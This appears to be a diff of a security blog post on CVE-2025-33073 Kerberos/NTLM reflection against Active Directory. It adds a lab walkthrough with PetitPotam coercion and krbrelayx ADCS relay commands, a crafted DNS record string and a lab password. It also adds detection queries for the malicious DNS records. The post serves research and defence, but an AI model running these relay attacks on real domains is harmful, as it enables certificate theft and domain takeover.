@@ -35,23 +35,16 @@ This post aims to highlight possible exploitation scenarios of this vulnerabilit
                 </ul>
             </li>
             <li>
-                <a href="#reflecting...-kerberos">Reflecting... Kerberos?</a>
+                <a href="#reflecting-kerberos">Reflecting Kerberos?</a>
             </li>
             <li>
                 <a href="#reflecting-to-http-adcs">Reflecting to HTTP (ADCS)</a>
                 <ul>
-                    <li><a href="#kerberos-authentication-coercion">Kerberos Authentication Coercion</a></li>
-                    <li><a href="#relay-to-esc8">Relay to ESC8</a></li>
+                    <li><a href="#reflecting-to-certificate-authority-self-relay">Reflecting to Certificate Authority (Self-Relay)</a></li>
                 </ul>
             </li>
             <li>
                 <a href="#summary--patches">Summary & Patches</a>
-            </li>
-            <li>
-                <a href="#mitigations--detections">Mitigations & Detections</a>
-                <ul>
-                    <li><a href="#monitor-abnormal-dns-records">Monitor Abnormal DNS Records</a></li>
-                </ul>
             </li>
         </ol>
     </div>
@@ -135,7 +128,7 @@ ntlmrelayx.py -t "smb://SCRIPTORIUM.jess.kingdom" -smb2support
 
 ![](./assets/img/sysadmin/e2f4bbf744f90409282c62cb47eaee7f.png)
 
-## Reflecting... Kerberos?
+## Reflecting Kerberos?
 
 In the case that NTLM authentication is disabled on the forest, we can still use this primitive to relay authentication to the target machine using Kerberos. This can be done using [krbrelayx.py](https://github.com/dirkjanm/krbrelayx/blob/master/krbrelayx.py) with slight modifications that can be found in the original blog post by [synacktiv](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025).
 
@@ -175,7 +168,7 @@ Traditionally, it's not been possible to abuse ESC8 to compromise the Certificat
 
 However, as mentioned briefly in [the previous blog post](https://blog.async.sg/sincon-2025-adcs-relay.html) - you can still relay to ESC8 using Kerberos. In addition to that, relaying with Kerberos breaks the "no self-relay" rule, as it does not contain a MIC. This allows us to compromise the `CA`, and the entire forest shortly after.
 
-### Kerberos Authentication Coercion
+### Reflecting to Certificate Authority (Self-Relay)
 
 Using the same technique as before, we can coerce Kerberos authentication to the domain controller using the malicious DNS record:
 
@@ -184,8 +177,6 @@ Using the same technique as before, we can coerce Kerberos authentication to the
 ```
 
 ![](./assets/img/sysadmin/1.jpg)
-
-### Relay to ESC8
 
 Now, we can relay the Kerberos authentication to the domain controller's HTTP enrollment endpoint using `krbrelayx.py`:
 
@@ -199,7 +190,31 @@ Using the generated certificate, we can very simply compromise the forest (as th
 
 ![](./assets/img/sysadmin/3.jpg)
 
-### Summary & Patches
+### Relaying to Domain Machines
+
+In some environments, `NTLM` authentication may be disabled. In such cases, it's a common misconception that `ESC8` is not exploitable. In addition to enabling HTTPS and enforcing EPA, [Microsoft also recommends disabling NTLM authentication](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429). Unfortunately, it is still possible to relay Kerberos authentication to domain machines using the same technique as before.
+
+As the target endpoint is the `CA` (`palace-dc`), the DNS string must be: `palace-dc1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` so that the associated SPN in the relayed ticket is `cifs/palace-dc`.
+
+```
+/opt/tools/PetitPotam/PetitPotam.py -d 'jess.kingdom' -u 'Doros_ARCHIVON' -p 'bO3n21E6rc' palace-dc1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA SCRIPTORIUM.jess.kingdom
+```
+
+![](./assets/img/sysadmin/20d83fa61526390953f13652cbaec77c.png)
+
+The `--victim` flag is used to specify the account name used in the certificate, as the `ntlmrelayx.py` library may fail to determine the correct account name to use in the certificate. In this case, we will use `SCRIPTORIUM$` as the victim account.
+
+```
+/opt/tools/krbrelayx/krbrelayx.py --target 'https://PALACE-DC.jess.kingdom/certsrv/certfnsh.asp' --adcs --template 'Machine' --victim 'SCRIPTORIUM$'
+```
+
+![](./assets/img/sysadmin/10796a351068cd7270c7d4427588f118.png)
+
+And similarly, this certificate can be used to compromise the `SCRIPTORIUM` machine using [S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13):
+
+![](./assets/img/sysadmin/e99c74a91d192594f258c71bb09431c8.png)
+
+## Summary & Patches
 
 Details can be found at these links:
 * [https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
@@ -209,4 +224,24 @@ Details can be found at these links:
 
 In order to mitigate this vulnerability, it is recommended to install the [latest security updates](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073) and enable SMB signing on all machines in the domain.
 
-Additionally, monitor for abnormal DNS record creation such as those with extremely long names and the string `localhost` in them. You may also find some lazy threat actors using the: `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` DNS record  name, so you can monitor for that as well.
+### Detection
+
+Thankfully this vulnerability, as well as the trick to coerce `Kerberos` authentication requires an attacker to create a relatively strange DNS record (ending with `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`). It is possible to hunt for the creation of such DNS records using the following PowerShell command:
+
+```powershell
+Get-DnsServerResourceRecord -ZoneName "jess.kingdom" | Where-Object { $_.HostName -like "*1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA*" }
+
+HostName                  RecordType Type       Timestamp            TimeToLive      RecordData
+--------                  ---------- ----       ---------            ----------      ----------
+localhost1UWhRCAAAAAAA... A          1          0                    00:03:00        198.51.100.5
+PALACE-DC1UWhRCAAAAAAA... A          1          0                    00:03:00        198.51.100.5
+SCRIPTORIUM1UWhRCAAAAA... A          1          0                    00:03:00        198.51.100.5
+```
+
+Alternatively, you may opt to create alerts for DNS queries against any hostname with `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`. This is a good indicator that an attacker is attempting to exploit this vulnerability.
+
+```
+(dns.question.type : "A" and dns.question.name : *1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA*)
+```
+
+![](./assets/img/sysadmin/90c7ce91334c42784c0f8f5918467df2.png)
